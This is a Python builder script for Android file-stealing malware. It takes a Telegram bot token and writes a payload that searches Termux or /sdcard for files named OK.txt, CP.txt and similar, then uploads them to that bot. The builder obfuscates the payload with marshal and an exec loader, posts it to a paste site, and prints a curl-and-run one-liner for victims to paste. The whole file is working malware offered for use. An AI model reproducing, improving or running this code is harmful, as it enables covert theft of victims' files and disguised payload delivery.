import json
import os
import sys
import requests
import marshal
from bs4 import BeautifulSoup
import random
import string


def randomname():
    a = random.choices(string.digits + string.ascii_uppercase, k=4)
    b = "".join(a)
    return b + ".py"
def Signpost(file):
    with open(file, 'r') as file:
        snipe = file.read()
    url = 'https://snippet.host/'

    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')

        form = soup.find('form', {'id': 'snippet-form'})

        if form:

            textarea = form.find('textarea', {'id': 'snippet-content'})

            if textarea:

                textarea.string = snipe

                form_action = form['action']

                form_data = {
                    'title': '',
                    'content': textarea.text,
                    'visibility': '2',
                    'language': 'python',
                    'expires': 'never'
                }

                response = requests.post(url + form_action, data=form_data)

                if response.status_code == 200:
                    return response.url + "/raw"
                else:
                    return "**********"
            else:
                print("Textarea 'snippet-content' not found within the form.")
        else:
            print("Form 'snippet-form' not found on the page.")
    else:
        print("Failed to access the website. Status code:", response.status_code)


def MarshalDecode(file):
    with open(file, 'rb') as f:
        source_code = f.read()

    compiled_code = compile(source_code, 'original_script.py', 'exec')
    encrypted_data = marshal.dumps(compiled_code)

    with open(file, 'wb') as bb:
        bb.write(encrypted_data)
    with open(file, 'rb') as f:
        encrypted_data = f.read()
    with open(file, 'w') as file:
        file.write(f''' 
## ENCRYPCTION BY Zeyad Alabany           
import marshal
compiled_code = marshal.loads({encrypted_data})
exec(compiled_code)
    ''')


class Zeyad:

    def __init__(self):
        self.make = ""
        self.id = ""

    def Basic(self):
        self.make = input("TOKEN BOT TELEGRAM : ")

        mas = requests.get(f"https://api.telegram.org/bot{self.make}/getUpdates")
        if mas.status_code == 200:
            pass
        else:
            sys.exit("\033[1;31m INVALID TOKEN BOT")
        ad = json.loads(mas.text)
        for mydata in ad['result']:

            fr = mydata['message']
            text = fr['text']
            if len(str(fr['from']['id'])) > 6:
                self.id = fr['from']['id']
            else:
                self.id = ""
                sys.exit("SEND BR3K TO BOT")
        print("here")
        self.Create_File(self.make, self.id)

    def Create_File(self, token, id):
        with open("zeyad.py", "w") as newfile:
            newfile.write(f"""
import os
os.system('pip install requests')
import requests
target = []
def Termux():
    if os.path.exists("/data/data/com.termux/files/home"):
        return True
    else:
        return False
def tele():
    for myfiles in target:
        files = {{
            "document": (myfiles, open(myfiles, "rb"))
        }}

        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}",
            files=files
        )

class Zeyad:
    def __init__(self):
        if Termux():
            self.Start_Termux()
        else:
            self.Start_Pydroid()
        

    def Start_Termux(self):
        for root, dirs, file in os.walk("/data/data/com.termux/files/home"):
            for files in file:
                all = os.path.join(root, files)
                ext = os.path.splitext(all)[1]
                if ext in [".txt"]:
                    get = os.path.basename(all)
                    if get in ["CP.txt", "OK.txt", "ok.txt", "cp.txt", ".ok.txt", ".cp.txt"]:
                        target.append(all)
        tele()
    def Start_Pydroid(self):
        for root, dirs, file in os.walk("/sdcard"):
            for files in file:
                all = os.path.join(root, files)
                ext = os.path.splitext(all)[1]
                if ext in [".txt"]:
                    get = os.path.basename(all)
                    if get in ["CP.txt", "OK.txt", "ok.txt", "cp.txt", ".ok.txt", ".cp.txt"]:
                        target.append(all)
Zeyad()
                    """)
        MarshalDecode("zeyad.py")
        com = Signpost("zeyad.py")
        rand = randomname()
        if "raw" in com:
                print(f"\033[1;31m curl {com} -o {rand} && python {rand}")
                sys.exit("\n COPY THIS")


a = Zeyad()
a.Basic()
